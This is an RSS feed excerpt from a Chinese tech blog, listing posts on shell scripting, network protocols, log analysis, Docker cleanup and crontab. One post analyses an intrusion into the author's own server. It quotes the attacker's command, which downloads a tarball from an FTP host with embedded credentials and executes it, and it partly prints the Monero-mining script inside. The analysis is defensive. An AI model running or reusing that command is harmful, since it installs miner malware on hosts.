      <title>列出网络中活动的主机</title>
      <link>https://wdd.js.org/shell/list-active-host/</link>
      <pubDate>Thu, 26 Dec 2019 10:34:15 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/list-active-host/</guid>
      <description>使用ping 优点 原生，不用安装软件 缺点 速度慢 下面的脚本列出 192.168.1.0/24的所有主机，大概需要255秒
#!/bin/bash function handler () { echo &amp;#34;will exit&amp;#34; exit 0 } trap &amp;#39;handler&amp;#39; SIGINT for ip in 192.168.1.{1..255} do ping -W 1 -c 1 $ip &amp;amp;&amp;gt; /dev/null if [ $? -eq 0 ]; then echo $ip is alive else echo $ip is dead fi done 使用fping 优点 速度快 缺点 需要安装fping # 安装fping brew install fping # mac yum install fping # centos apt install fping # debian 我用的fping 是MacOS X， fping的版本是4.</description>
    </item>
    
    <item>
      <title>入侵脚本分析 - 瞒天过海</title>
      <link>https://wdd.js.org/shell/evil-script/</link>
      <pubDate>Mon, 23 Dec 2019 18:54:01 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/evil-script/</guid>
      <description>机器被入侵了，写点东西，分析一下入侵脚本，顺便也学习一下。
bash -c curl -O ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz;tar xvf sshd.tgz;rm -rf sshd.tgz;cd .ssd;chmod +x *;./go -r 下载恶意软件 恶意软件的是使用 ftp下载的， 地址是：ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz，这个153.122.137.67 IP是位于日本东京，ssd.taz是一个tar包，用tar解压之后，出现一个sh文件，两个可执行文件。
-rwxr-xr-x 1 1001 1001 907 Nov 20 20:58 go # shell -rwxrwxr-x 1 1001 1001 1.3M Nov 20 21:06 i686 # 可执行 -rwxrwxr-x 1 1001 1001 1.1M Nov 20 21:06 x86_64 # 可执行 分析可执行文件 go go是一个shell程序，下文是分析
#!/bin/bash # pool.supportxmr.com门罗币的矿池 # 所以大家应该清楚了，入侵的机器应该用来挖矿的 # 这一步是测试本机与矿池dns是否通 if [ $(ping -c 1 pool.supportxmr.com 2&amp;gt;/dev/null|grep &amp;#34;bytes of data&amp;#34; | wc -l ) -gt &amp;#39;0&amp;#39; ]; then dns=&amp;#34;&amp;#34; # dns通 else dns=&amp;#34;-d&amp;#34; # dns不通 fi # 删除用户计划任务，并将报错信息清除 crontab -r 2&amp;gt;/dev/null # 这一步不太懂 rm -rf /tmp/.</description>
    </item>
    
    <item>
      <title>2 链路层</title>
      <link>https://wdd.js.org/network/xwuvyr/</link>
      <pubDate>Thu, 28 Nov 2019 13:35:34 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/xwuvyr/</guid>
      <description>最大传输单元MTU 以太网和802.3对数据帧的长度有个限制，其最大长度分别是1500和1942。链路层的这个特性称作MTU, 最大传输单元。不同类型的网络大多数都有一个限制。
如果IP层的数据报的长度比链路层的MTU大，那么IP层就需要分片，每一片的长度要小于MTU。
使用netstat -in可以打印出网络接口的MTU
➜ ~ netstat -in Kernel Interface table Iface MTU Met RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flg eth2 1500 0 1078767768 2264 689 0 1297577913 0 0 0 BMRU lo 16436 0 734474 0 0 0 734474 0 0 0 LRU 路径MTU 信息经过多个网络时，不同网络可能会有不同的MTU，而其中最小的一个MTU, 称为路径MTU。</description>
    </item>
    
    <item>
      <title>1 概述</title>
      <link>https://wdd.js.org/network/ir1i82/</link>
      <pubDate>Wed, 27 Nov 2019 09:20:48 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/ir1i82/</guid>
      <description>分层 应用程序一般处理应用层的
------------------------------------------------------------ 应用层 # Telnet, FTP, Email, MySql	| 应用程序细节	| 用户进程 ------------------------------------------------------------ 运输层 # TCP, UDP | 内核(处理通信细节) 端到端通信 | ------------------------------------------| 网络层 # IP, ICMP, IGMP	| 逐跳通信，处理分组相关的活动，例如分组选路| ------------------------------------------| 链路层 # 设备驱动程序 接口卡	| 处理物理信号	| ------------------------------------------------------------ 应用层和传输层使用端到端的协议 网络层提供逐跳的协议 网桥在链路层来连接网络 路由器在网络层连接网络 以太网数据帧的物理特性是长度必须在46-1500字节之间 封装 以太网帧用来封装IP数据报。
IP数据报 = IP首部(20字节) + TCP首部(20字节) + 应用数据 # 针对TCP IP数据报 = IP首部(20字节) + UDP首部(8字节) + 应用数据 # 针对UDP 以太网帧 = 以太网首部(14字节) + IP数据报(46-1500字节) + 以太网尾部(4字节) IP数据报最大为1500字节，减去20字节IP首部，8字节UDP首部，留给UDP应用数据的只有1472字节。</description>
    </item>
    
    <item>
      <title>技巧1</title>
      <link>https://wdd.js.org/network/kttu4i/</link>
      <pubDate>Mon, 25 Nov 2019 20:24:24 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/kttu4i/</guid>
      <description>1 面向连接和面向非连接的区别？ 面向连接与面向非连接并不是指的物理介质，而是指的分组数据包。而实际上，连接只是一个虚拟的概念。
数据在发送前，会被分组发送。对于面向连接的协议来说，每个分组之间都有顺序的，分组会存储自己的位置信息。
可以理解在同一时间只维持一段关系。
面向非连接协议，分组直接并无任何关系，每个分组都是相互独立的。可以理解为脚踏多条船。</description>
    </item>
    
    <item>
      <title>基本套接字API回顾</title>
      <link>https://wdd.js.org/network/base-socket/</link>
      <pubDate>Mon, 25 Nov 2019 20:06:16 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/base-socket/</guid>
      <description>套接字API SOCKET socket(int domain, int type, int protocol) Socket API和协议无关，即可以用来创建Socket，无论是TCP还是UDP，还是进程间的通信，都可以用这个接口创建。
domain 表示通信域，最长见的有以下两个域 AF_INET 因特网通信 AF_LOCAL 进程间通信 type 表示套接字的类型 SOCK_STREAM 可靠的、全双工、面向连接的，实际上就是我们熟悉的TCP SOCK_DGRAM 不可靠、尽力而为的，无连接的。实际上指的就是UDP SOCK_RAW 允许对IP层的数据进行访问。用于特殊目的，例如ICMP protocol 表示具体通信协议 TCP/IP 本自同根生！</description>
    </item>
    
    <item>
      <title>shell数学运算</title>
      <link>https://wdd.js.org/shell/match-eval/</link>
      <pubDate>Sat, 26 Oct 2019 14:18:08 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/match-eval/</guid>
      <description>主要的数据运算方式
let (()) [] expr bc 使用let 使用let时，等号右边的变量不需要在加上$符号
#!/bin/bash no1=1; no2=2; # 注意两个变量的值的类型实际上是字符串 re1=$no1+$no2 # 注意此时re1的值是1+2 let result=no1+no2 # 此时才是想获取的两数字的和，3 </description>
    </item>
    
    <item>
      <title>字符串操作</title>
      <link>https://wdd.js.org/shell/string-operator/</link>
      <pubDate>Sat, 26 Oct 2019 14:16:28 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/string-operator/</guid>
      <description>
获取字符串长度 需要在变量前加个**#**
name=wdd echo ${#name} 首尾去空格 echo &amp;#34; abcd &amp;#34; | xargs 字符串包含 # $var是否包含字符串A if [[ $var =~ &amp;#34;A&amp;#34; ]]; then echo fi # $var是否以字符串A开头 if [[ $var =~ &amp;#34;^A&amp;#34; ]]; then echo fi # $var是否以字符串A结尾 if [[ $var =~ &amp;#34;A$&amp;#34; ]]; then echo fi 字符串提取 #!/bin/bash num1=${test#*_} num2=${num1#*_} surname=${num2%_*} num4=${test##*_} profession=${num4%.*} #*_ 从左边开始，去第一个符号“_”左边的所有字符 % _* 从右边开始，去掉第一个符号“_”右边的所有字符 ##*_ 从右边开始，去掉第一个符号“_”左边的所有字符 %%_* 从左边开始，去掉第一个符号“_”右边的所有字符 判断某个字符串是否以特定字符开头 if [[ $TAG =~ ABC* ]]; then echo $TAG is begin with ABC fi </description>
    </item>
    
    <item>
      <title>流程控制</title>
      <link>https://wdd.js.org/shell/flow-control/</link>
      <pubDate>Fri, 18 Oct 2019 13:06:58 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/flow-control/</guid>
      <description>
if then // good if [ -d public ] then echo &amp;#34;public exist&amp;#34; if // good if [ -d public ]; then echo &amp;#34;public exist&amp;#34; if // error: if和then写成一行时，条件后必须加上分号 if [ -d public ] then echo &amp;#34;public exist&amp;#34; if // error: shell对空格比较敏感，多个空格和少个空格，执行的含义完全不同 // 在[]中，内侧前后都需要加上空格 if [-d public] then echo &amp;#34;public exist&amp;#34; if if elif then if [ -d public ] then echo &amp;#34;public exist&amp;#34; elif then 循环 switch 常用例子 判断目录是否存在 if [ -d public ] then echo &amp;#34;public exist&amp;#34; if 判断文件是否存在 </description>
    </item>
    
    <item>
      <title>彩色文本与彩色背景打印</title>
      <link>https://wdd.js.org/shell/colorful-print/</link>
      <pubDate>Wed, 16 Oct 2019 13:57:29 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/colorful-print/</guid>
      <description>
打印彩色字体 0 重置 30 黑色 31 红色 32 绿色 33 黄色 34 蓝色 35 洋红 36 青色 37 白色 把31改成其他数字，就可打印其他颜色的this了。大部分情况下，我们只需要记住红色和绿色就可以了
echo -e &amp;#34;\e[1;31m this \e[0m whang&amp;#34; 打印彩色背景 0 重置 40 黑色 41 红色 42 绿色 43 黄色 44 蓝色 45 洋红 46 青色 47 白色 echo -e &amp;#34;\e[1;45m this \e[0m whang&amp;#34; </description>
    </item>
    
    <item>
      <title>Gitbook好书推荐</title>
      <link>https://wdd.js.org/fe/gitbook-good-book/</link>
      <pubDate>Tue, 15 Oct 2019 22:01:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/gitbook-good-book/</guid>
      <description>1. Front-End Developer Handbook 2017 地址：https://frontendmasters.com/books/front-end-handbook/2017/ 这是任何人都可以用来了解前端开发实践的指南。它大致概述并讨论了前端工程的实践：如何学习它，以及在2017年实践时使用什么工具。
这是专门为潜在的和目前实践的前端开发人员提供专业资源，以配备学习材料和开发工具。其次，管理者，首席技术官，导师和猎头人士可以使用它来了解前端开发的实践。
手册的内容有利于网络技术（HTML，CSS，DOM和JavaScript）以及直接构建在这些开放技术之上的解决方案。本书中引用和讨论的材料是课堂上最好的或目前提出的问题。
该书不应被视为对前端开发人员可用的所有资源的全面概述。这本书的价值被简单，集中和及时地组织起来，仅仅是足够的绝对信息，以免任何人在任何一个特定的主题上压倒一切。
目的是每年发布一次内容更新。
手册分为三部分。
第一部分。前端实践
第一部分广泛描述了前端工程的实践。
第二部分：学习前端发展
第二部分指出了自主导向和直接的资源，用于学习成为前端开发人员。
第三部分：前端开发工具
第三部分简要解释和识别交易工具。
2. JS函数式编程指南 英文版地址： 中文版地址：https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/
这本书的主题是函数范式（functional paradigm），我们将使用 JavaScript 这个世界上最流行的函数式编程语言来讲述这一主题。有人可能会觉得选择 JavaScript 并不明智，因为当前的主流观点认为它是一门命令式（imperative）的语言，并不适合用来讲函数式。但我认为，这是学习函数式编程的最好方式，因为：
你很有可能在日常工作中使用它
这让你有机会在实际的编程过程中学以致用，而不是在空闲时间用一门深奥的函数式编程语言做一些玩具性质的项目。
你不必从头学起就能开始编写程序
在纯函数式编程语言中，你必须使用 monad 才能打印变量或者读取 DOM 节点。JavaScript 则简单得多，可以作弊走捷径，因为毕竟我们的目的是学写纯函数式代码。JavaScript 也更容易入门，因为它是一门混合范式的语言，你随时可以在感觉吃力的时候回退到原有的编程习惯上去。
这门语言完全有能力书写高级的函数式代码
只需借助一到两个微型类库，JavaScript 就能模拟 Scala 或 Haskell 这类语言的全部特性。虽然面向对象编程（Object-oriented programing）主导着业界，但很明显这种范式在 JavaScript 里非常笨拙，用起来就像在高速公路上露营或者穿着橡胶套鞋跳踢踏舞一样。我们不得不到处使用 bind 以免 this 不知不觉地变了，语言里没有类可以用（目前还没有），我们还发明了各种变通方法来应对忘记调用 new 关键字后的怪异行为，私有成员只能通过闭包（closure）才能实现，等等。对大多数人来说，函数式编程看起来更加自然。+
以上说明，强类型的函数式语言毫无疑问将会成为本书所示范式的最佳试验场。JavaScript 是我们学习这种范式的一种手段，将它应用于什么地方则完全取决于你自己。幸运的是，所有的接口都是数学的，因而也是普适的。最终你会发现你习惯了 swiftz、scalaz、haskell 和 purescript，以及其他各种数学偏向的语言。
3. 前端开发笔记本 地址：http://chanshuyi.github.io/frontend_notebook/
前端开发笔记本涵括了大部分前端开发所需的知识点，主要包括5大部分：《页面制作》、《JavaScript程序设计》、《DOM编程》、《页面架构》、《前端产品架构》。</description>
    </item>
    
    <item>
      <title>可能被遗漏的https与http的知识点</title>
      <link>https://wdd.js.org/network/of5hny/</link>
      <pubDate>Tue, 15 Oct 2019 21:56:42 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/of5hny/</guid>
      <description>1. HTTPS域向HTTP域发送请求会被浏览器直接拒绝，HTTP向HTTPS则不会 例如在github pages页面，这是一个https页面，如果在这个页面向http发送请求，那么会直接被浏览器拒绝，并在控制台输出下面的报错信息。
jquery-1.11.3.min.js:5 Mixed Content: The page at &amp;#39;https://wangduanduan.github.io/ddddddd/&amp;#39; was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint &amp;#39;http://cccccc/&amp;#39;. This request has been blocked; the content must be served over HTTPS. 如果你在做第三方集成的系统，如果他们是在浏览器中直接调用你提供的接口，那么最好你使用https协议，这样无论对方是https还是http都可以访问。（相信我，这个很重要，我曾经经历过上线后遇到这个问题，然后连夜申请证书，把http升级到https的痛苦经历）
2. HTTPS的默认端口是443，而不是443 如果443端口已经被其他服务占用了，那么使用其他任何没有被占用的端口都可以用作HTTPS服务，只不过在请求的时候需要加上端口号罢了。</description>
    </item>
    
    <item>
      <title>awk、grep、cut、sort、uniq简单命令玩转日志分析与统计</title>
      <link>https://wdd.js.org/shell/grep-awk-sort/</link>
      <pubDate>Tue, 15 Oct 2019 21:35:15 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/grep-awk-sort/</guid>
      <description>test.log
2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn 按列分割 提取第三列
日志列数比较少或则要提取的字段比较靠前时，优先使用awk。当然cut也可以做到。
比如输出日志的第三列
awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列 cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符 正则提取 提取cause字段的原因值？
2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34; 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn 当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取。最好用的方式是用grep的正则提取。
好像grep不支持捕获分组，所以只能提取出出cause:&amp;ldquo;AAA&amp;rdquo;，而无法直接提取出AAA
E 表示使用正则 o 表示只显示匹配到的内容 &amp;gt; grep -Eo &amp;#39;cause:&amp;#34;.</description>
    </item>
    
    <item>
      <title>ngrep明文http抓包教程</title>
      <link>https://wdd.js.org/network/pxn896/</link>
      <pubDate>Fri, 16 Aug 2019 09:59:08 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/pxn896/</guid>
      <description>一般使用tcpdump抓包，然后将包文件下载到本机，用wireshark去解析过滤。
但是这样会显得比较麻烦。
ngrep可以直接在linux转包，明文查看http的请求和响应信息。
安装 apt install ngrep # debian yum install ngrep # centos7 # 如果centos报错没有ngrep, 那么执行下面的命令, 然后再安装 rpm -ivh http://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm HTTP抓包 -W byline 头信息会自动换行 host 192.168.60.200 是过滤规则 源ip或者目的ip是192.168.60.200 ngrep -W byline host 192.168.60.200 interface: eth0 (192.168.1.0/255.255.255.0) filter: (ip or ip6) and ( host 192.168.60.200 ) #### T 192.168.1.102:39510 -&amp;gt; 192.168.60.200:7775 [AP] GET / HTTP/1.1. Host: 192.168.60.200:7775. User-Agent: curl/7.52.1. Accept: */*. . # T 192.168.60.200:7775 -&amp;gt; 192.168.1.102:39510 [AP] HTTP/1.1 302 Moved Temporarily.</description>
    </item>
    
    <item>
      <title>Docker镜像批量清理脚本</title>
      <link>https://wdd.js.org/shell/docker-clean-tips/</link>
      <pubDate>Tue, 06 Aug 2019 13:48:13 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/docker-clean-tips/</guid>
      <description>使用jenkins作为打包的工具，主机上的磁盘空间总是被慢慢被占满，直到jenkins无法运行。本文从几个方面来清理docker垃圾。
批量删除已经退出的容器 docker ps -a | grep &amp;#34;Exited&amp;#34; | awk &amp;#39;{print $1 }&amp;#39; | xargs docker rm 批量删除带有none字段的镜像 $3一般就是取出每一行的镜像id字段
# 方案1： 根据镜像id删除镜像 docker images| grep none |awk &amp;#39;{print $3 }&amp;#39;|xargs docker rmi # 方案2: 根据镜像名删除镜像 docker images | grep wecloud | awk &amp;#39;{print $1&amp;#34;:&amp;#34;$2}&amp;#39; | xargs docker rmi 方案1，根据镜像ID删除镜像时，有写镜像虽然镜像名不同，但是镜像ID都是相同的，这是后往往会删除失败。所以根据镜像名删除镜像的效果会更好。
删除镜像定时任务脚本 #!/bin/bash # create by wangduanduan # when current free disk less then max free disk, you can remove docker images # GREEN=&amp;#39;\033[0;32m&amp;#39; RED=&amp;#39;\033[0;31m&amp;#39; NC=&amp;#39;\033[0m&amp;#39; max_free_disk=5 # 5G.</description>
    </item>
    
    <item>
      <title>awk、grep、cut、sort、uniq简单命令玩转日志分析与统计</title>
      <link>https://wdd.js.org/shell/log-ana/</link>
      <pubDate>Tue, 06 Aug 2019 11:24:53 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/log-ana/</guid>
      <description>test.log
2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn 按列分割 提取第三列日志列数比较少或则要提取的字段比较靠前时，优先使用awk。当然cut也可以做到。比如输出日志的第三列
awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列 cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符 正则提取 提取cause字段的原因值？
2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34; 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn 当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取。最好用的方式是用grep的正则提取。好像grep不支持捕获分组，所以只能提取出出cause:&amp;ldquo;AAA&amp;rdquo;，而无法直接提取出AAA
E 表示使用正则 o 表示只显示匹配到的内容 &amp;gt; grep -Eo &amp;#39;cause:&amp;#34;.*?&amp;#34;&amp;#39; test.log cause:&amp;#34;AAA&amp;#34; cause:&amp;#34;BBB&amp;#34; cause:&amp;#34;AAA&amp;#34; cause:&amp;#34;BBJ&amp;#34; 统计 对输出的关键词进行统计，并按照升序或者降序排列。将关键词按照列或者按照正则提取出来之后，首先要进行sort排序, 然后再进行uniq去重。不进行排序就直接去重，统计的值就不准确。因为uniq去重只能去除连续的相同字符串。不是连续的字符串，则会统计多次。下面例子：非连续的cause:&amp;ldquo;AAA&amp;rdquo;，没有被合并在一起计数</description>
    </item>
    
    <item>
      <title>Regex Tools</title>
      <link>https://wdd.js.org/fe/regex-tools/</link>
      <pubDate>Sat, 13 Jul 2019 09:53:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/regex-tools/</guid>
      <description>regex101: 功能最强 https://regex101.com/
regex101的功能最强，支持php, js, python, 和go的正则表达式
Regulex：正则可视化 https://jex.im/regulex/#!flags=&amp;amp;re=%5E(a%7Cb)*%3F%24
regulex仅支持js的正则，
regexper：正则可视化 https://regexper.com/
pyregex：专注python正则 http://www.pyregex.com/</description>
    </item>
    
    <item>
      <title>图解通信网络 第二版</title>
      <link>https://wdd.js.org/network/graph-network/</link>
      <pubDate>Mon, 08 Jul 2019 21:32:50 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/graph-network/</guid>
      <description>图片来自 https://microchipdeveloper.com/ 只不过这个网站访问速度很慢，但是里面的图片非常有意思，能够简洁明了的说明一个概念。
上学的时候，数学老师喜欢在讲课前先讲一些概念，然后再做题。但是我觉得概念并没有那么重要，我更喜欢做题。
但是，当你理解了概念后，再去实战，就有事半功倍的效果。
1. 路由器 路由器（英语：Router，又称路径器）是一种电讯网络设备，提供路由与转送两种重要机制，可以决定数据包从来源端到目的端所经过的路由路径（host到host之间的传输路径），这个过程称为路由；将路由器输入端的数据包移送至适当的路由器输出端（在路由器内部进行），这称为转送。路由工作在OSI模型的第三层——即网络层，例如网际协议（IP）。
路由器用来做网络之间的链接，所以路由器一般至少会链接到两个网络上。常见的就是一边连接外网，一边连接内网。
2. IP地址 3. 交换机 4. 五层网络模型 5. TCP vs UDP 6. TCP 和 UDP 头 7. 常见的端口号 8. 客户端和服务端 9. Socket 10. Socket建立 11. 一个Web服务器的工作过程s step1: 服务器在80端口监听消息 step2: 客户端随机选择一个端口，向服务端发起连接请求 step3: 传输层将消息传输给服务器 服务端建立一个Socket用来和客户端建立通道
step4: 服务器通过socket将html发给客户端 step5: 消息接受完毕，Socket关闭 12 NAT 参考 https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%99%A8 </description>
    </item>
    
    <item>
      <title>长太息以掩涕兮，哀crontab之难用</title>
      <link>https://wdd.js.org/shell/crontab-tips/</link>
      <pubDate>Mon, 01 Jul 2019 18:59:57 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/crontab-tips/</guid>
      <description>我已经在crontab上栽了很多次跟头了，我决定写个总结。
常用的命令 crontab -l # 显示计划任务脚本 crontab -e # 编辑计划任务 计划任务的格式 时间格式 * # 每个最小单元 / # 时间步长，每隔多长时间执行 */10 - # 区间，如 4-9 , # 散列，如 4,9,10 几个例子 crontab 最小支持的时间单位是1分钟，不支持每个多少秒执行一次
# 每分钟执行 * * * * * cmd # 每小时的15，45分钟执行 15,45 * * * * cmd # 每个周一到周五，早上9点到下午6点之间，每隔15分钟喝一次水 */15 9,18 * * 1-5 喝水 每个X秒执行 crontab的默认最小执行周期是1分钟，如果想每隔多少秒执行一次，就需要一些特殊的手段。
每隔5秒 * * * * * for i in {1..12}; do /bin/cmd -arg1 ; sleep 5; done 每隔15秒 * * * * * /bin/cmd -arg1 * * * * * sleep 15; /bin/cmd -arg1 * * * * * sleep 30; /bin/cmd -arg1 * * * * * sleep 45; /bin/cmd -arg1 为什么crontab指定的脚本没有执行？ 有以下可能原因</description>
    </item>
    
    <item>
      <title>如何学习网络协议？</title>
      <link>https://wdd.js.org/posts/2019/books-about-network-protocol/</link>
      <pubDate>Fri, 18 Jan 2019 21:32:08 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2019/books-about-network-protocol/</guid>
      <description>如何学习网络协议？ 大学时，学到网络协议的7层模型时，老师教了大家一个顺口溜：物数网传会表应。并说这是重点，年年必考，5分的题目摆在这里，你们爱背不背。 考试的时候，果然遇到这个问题，搜索枯肠，只能想到这7个字的第一个字，因为这5分，差点挂科。 后来工作面试，面试官也是很喜欢七层模型，三次握手之类的问题，但是遇到这些问题时，总是觉得很心虚。
1. 协议分层 四层网络协议模型中，应用层以下一般都是交给操作系统来处理。应用层对于四层模型来说，仅仅是冰山一角。海面下巨复杂的三层协议，都被操作系统给隐藏起来了，一般我们在页面上发起一个ajax请求，看见了network面板多了一个http请求，至于底层是如何实现的，我们并不关心。
应⽤层负责处理特定的应⽤程序细节。 运输层运输层主要为两台主机上的应⽤程序提供端到端的通信。 网络层处理理分组在⽹网络中的活动，例例如分组的选路 链路层处理理与电缆(或其他任何传输媒介)的物理理接⼝口细节 下面重点讲一下运输层和网络层
1.1. 运输层的两兄弟 运输层有两个比较重要的协议。tcp和udp。
大哥tcp是比较严谨认真、温柔体贴、慢热内向的协议，发出去的消息，总是一个一个认真检查，等待对方回复和确认，如果一段时间内，对方没有回复确认消息，还会再次发送消息，如果对方回复说你发的太快了，tcp还会体贴的把发送消息的速度降低。
弟弟udp则比较可爱呆萌、调皮好动、不负责任的协议。哥哥tcp所具有的特点，弟弟udp一个也没有。但是有的人说不清哪里好 但就是谁都替代不了，udp没有tcp那些复杂的校验和重传等复杂的步骤，所以它发送消息非常快，而且并不保证对方一定收到。如果对方收不到消息，那么udp就会呆萌的看着你，笑着对你说：我已经尽力了。一般语音而视频数据都是用udp协议传输的，因为音频或者视频卡了一下并不影响整体的质量，而对实时性的要求会更高。
1.2. 运输层和网络层的区别 运输层关注的是端到端层面，及End1到End2，忽略中间的任何点。 网络层关注两点之间的层面，即hop1如何到hop2，hop2如何到hop3 网络层并不保证消息可靠性，可靠性上层的传输层负责。TCP采用超时重传，分组确认的机制，保证消息不会丢失。 从下图tcp, udp, ip协议中，可以发现
传输层的tcp和udp都是有源端口和目的端口，但是没有ip字段 源ip和目的ip只在ip数据报中 理解各个协议，关键在于理解报文的各个字段的含义 1.3. ip和端口号的真正含义 上个章节讲到运输层和网络层的区别，其中端口号被封装在运输层，ip被封装到网络成，
那么端口号和ip地址到底有什么区别呢？
ip用来用来标记主机的位置 端口号用来标记该数据应该被目标主机上的哪个应用程序去处理 1.4. 数据在协议栈的流动 封装与分用 当发送消息时，数据在向下传递时，经过不同层次的协议处理，打上各种头部信息 当接受消息时，数据在向上传递，通过不同的头部信息字段，才知道要交给上层的那个模块来处理。比如一个ip包，如果没有头部信息，那么这个消息究竟是交给tcp协议来处理，还是udp来处理，就不得而知了 2. 深入阅读，好书推荐 《http权威指南》 有人说这本书太厚，偷偷告诉你，其实这本书并厚，因为这本书的后面的30%部分都是附录，这本书的精华是前50%的部分 《图解http》、《图解tcp/ip》这两本图解的书，知识点讲的都是比较通俗易懂的，适合入门 《tcp/ip 详解 卷1》这本书，让你知其然，更知其所以然 《tcp/ip 基础》、《tcp/ip 路由技术》这两本书，会让你从不同角度思考协议 《精通wireshark》、《wireshark网络分析实战》如果你看了很多书，却从来没有试过网络抓包，那你只是懂纸上谈兵罢了。你永远无法理解tcp三次握手的怦然心动，与四次分手的刻骨铭心。 </description>
    </item>
    
    <item>
      <title>呼叫中心简史</title>
      <link>https://wdd.js.org/posts/2019/call-center-brief-history/</link>
      <pubDate>Tue, 15 Jan 2019 21:04:11 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2019/call-center-brief-history/</guid>
      <description>什么是呼叫中心？ 呼叫中心又称为客户服务中心。有以下关键词
CTI 通信网络 计算机 企业级 高质量、高效率、全方位、综合信息服务 呼叫中心历史 1956年美国泛美航空公司建成世界第一家呼叫中心。
阶段 行业范围 技术 功能与意义 第一代呼叫中心 民航 PBX、电话排队 主要服务由人工完成 第二代呼叫中心 银行、生活 IVR(交互式语音应答)、DTMF 显著提高工作效率，提供全天候服务 第三代呼叫中心 CTI(电脑计算机集成) 语音数据同步，客户信息存储与查阅，个性化服务，自动化 第四代呼叫中心 接入电子邮件、互联网、手机短信等 多渠道接入、多渠道统一排队 第五代呼叫中心 接入社交网络、社交媒体(微博、微信等) 文本交谈，音频视频沟通 呼叫中心分类 按呼叫方式分类 外呼型呼叫中心（如电话营销） 客服型呼叫中心（如客户服务） 混合型呼叫中心 （如营销和客服） 按技术架构分类 交换机 板卡 软交换（IPCC） 【交换机类型呼叫中心】</description>
    </item>
    
    <item>
      <title>时间花在哪里，你就会成为什么样的人</title>
      <link>https://wdd.js.org/posts/2018/where-time-you-spend-what-you-will-be/</link>
      <pubDate>Tue, 01 Jan 2019 21:02:08 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/where-time-you-spend-what-you-will-be/</guid>
      <description>2008-2018 十年，往事如昨 2018年已经是昨天，今天是2019的第一天。
2008年已经是10年前，10年前的傍晚，我走在南京仙林的一个大街上，提着一瓶矿泉水，擦着额头的汗水，仰头看着大屏幕上播放着北京奥运会的开幕式。
10年前的夏天，我带着一步诺基亚手机功能机，独自一人去了南京。
坐过绣球公园的石凳，穿过天妃宫的回廊，吹过阅江楼的凉爽的江风，踏着古老斑驳的城墙，在林荫小路的长椅上，我想着10年后我会在哪里？做着什么事情？
往事如昨，而今将近而立，但是依然觉得自己还是10年的那个独自出去玩的小男孩。
2018 读了10年都没有读完的书，五味杂陈 2018年，在我做手术前，我觉得自己出了工作的时间外，大多数时间都在看书。2018年这一年看的书，要比2008到2018年这十年间的看的书都要多。这都归功于我对每天的看书都有定量的计划，一旦按照这个计划实行几个月，积累的效果还是非常明显的。
2018年，手机几乎成为人的四肢之外的第五肢。对大多人来说，上厕所可以不带纸，但是不能不带手机。
